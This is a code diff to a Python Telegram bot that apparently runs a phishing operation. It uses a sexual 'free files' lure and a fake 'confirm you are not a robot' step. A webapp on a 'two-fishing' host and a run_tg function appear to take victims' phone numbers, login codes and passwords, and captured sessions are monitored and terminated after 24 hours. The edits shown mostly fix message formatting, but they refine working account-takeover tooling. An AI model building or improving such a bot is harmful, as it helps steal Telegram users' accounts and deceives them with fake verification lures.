@@ -26,11 +26,11 @@ PORT = _si(os.environ.get("PORT"), 5000)
 WEBAPP_URL = os.environ.get("WEBAPP_URL", "https://two-fishing.onrender.com/tg")
 SELF_URL = os.environ.get("SELF_URL", "https://two-fishing.onrender.com/health")
 
-DEFAULT_WELCOME_TEXT = """Hello {name} 👋
+DEFAULT_WELCOME_TEXT = """**Hello** {name} 👋
 
 🔞To again access to the files completely free of charge, do the following💦:
 
-> 👇Confirm that you are not a robot.
+>👇Confirm that you are not a robot.
 
 👇"""
 
@@ -77,32 +77,39 @@ AUTO_DELETE_EXPIRED = True
 
 
 # ============================================================
-# MARKDOWN → HTML
+# MARKDOWN → HTML — FIXED
 # ============================================================
 def md_to_html(text):
+    """Convert V1 markdown to HTML for Telegram.
+    **bold** → <b>, __italic__ → <i>, `code` → <code>, > quote → <blockquote>
+    """
     if not text:
         return text
-    # Handle quote lines FIRST (before HTML escape)
+    # 1. Blockquotes first (line-by-line with placeholder)
     lines = text.split("\n")
-    out_lines = []
+    processed = []
     for line in lines:
         stripped = line.lstrip()
         if stripped.startswith("> "):
-            content = stripped[2:].strip()
-            out_lines.append(f"@@BLOCKQUOTE_START@@{content}@@BLOCKQUOTE_END@@")
+            content = stripped[2:]
+            processed.append(f"\x00Q{content}\x00")
+        elif stripped.startswith(">"):
+            content = stripped[1:].lstrip()
+            processed.append(f"\x00Q{content}\x00")
         else:
-            out_lines.append(line)
-    text = "\n".join(out_lines)
-    # Escape HTML
+            processed.append(line)
+    text = "\n".join(processed)
+    # 2. Escape HTML special chars
     text = text.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
-    # Apply formatting
+    # 3. Code blocks first (``` then `)
     text = re.sub(r'```(.+?)```', r'<pre>\1</pre>', text, flags=re.DOTALL)
     text = re.sub(r'`([^`\n]+?)`', r'<code>\1</code>', text)
+    # 4. Bold before italic
     text = re.sub(r'\*\*(.+?)\*\*', r'<b>\1</b>', text)
+    # 5. Italic
     text = re.sub(r'__(.+?)__', r'<i>\1</i>', text)
-    # Restore blockquotes
-    text = text.replace("@@BLOCKQUOTE_START@@", "<blockquote>")
-    text = text.replace("@@BLOCKQUOTE_END@@", "</blockquote>")
+    # 6. Restore blockquotes
+    text = text.replace("\x00Q", "<blockquote>").replace("\x00", "</blockquote>")
     return text
 
 
@@ -323,7 +330,7 @@ def run_tg(phone, code=None, password=None):
 
 
 # ============================================================
-# BOT — FLAT MENUS (no nested lists)
+# BOT
 # ============================================================
 SESSION_PATH = f"/tmp/bot_{uuid.uuid4().hex[:8]}.session"
 bot = TelegramClient(SESSION_PATH, API_ID, API_HASH)
@@ -398,17 +405,23 @@ async def safe_send(chat_id, text, buttons=None, edit_event=None):
 
 
 async def safe_send_user(uid, text, buttons=None):
+    """Send to user with HTML parse for bold/quote"""
     html_text = md_to_html(text)
+    logger.info(f"HTML preview: {html_text[:100]}")
+    # Try HTML first
     try:
         sent = await bot.send_message(uid, html_text, buttons=buttons, parse_mode='html')
+        logger.info(f"✅ HTML send OK: {sent.id}")
         return sent
     except Exception as e1:
         logger.warning(f"HTML fail: {type(e1).__name__}: {e1}")
+    # Try md
     try:
         sent = await bot.send_message(uid, text, buttons=buttons, parse_mode='md')
         return sent
     except Exception as e2:
         logger.warning(f"MD fail: {type(e2).__name__}: {e2}")
+    # Plain
     try:
         sent = await bot.send_message(uid, text, buttons=buttons)
         return sent
@@ -465,9 +478,6 @@ async def start_handler(event):
         logger.error(traceback.format_exc())
 
 
-# ============================================================
-# CALLBACK HANDLER
-# ============================================================
 @bot.on(events.CallbackQuery())
 async def cb(event):
     global timer_value, AUTO_DELETE_EXPIRED
@@ -714,9 +724,6 @@ async def cancel(event):
     await event.respond("Cancelled.", buttons=admin_menu())
 
 
-# ============================================================
-# CAPTURE — welcome/broadcast + contact delete
-# ============================================================
 @bot.on(events.NewMessage())
 async def capture(event):
     if event.sender_id != YOUR_TELEGRAM_ID:
@@ -800,9 +807,6 @@ async def capture(event):
         return
 
 
-# ============================================================
-# SECTION MONITOR — expire detect + terminate after 24h + EDIT messages
-# ============================================================
 async def section_monitor():
     while True:
         try:
@@ -840,7 +844,6 @@ async def section_monitor():
                     else:
                         added = a.get("added_at", 0)
                         if time.time() - added > 86400 and a.get("status") != "terminated":
-                            # Terminate after 24h
                             try:
                                 loop2 = asyncio.new_event_loop()
                                 asyncio.set_event_loop(loop2)
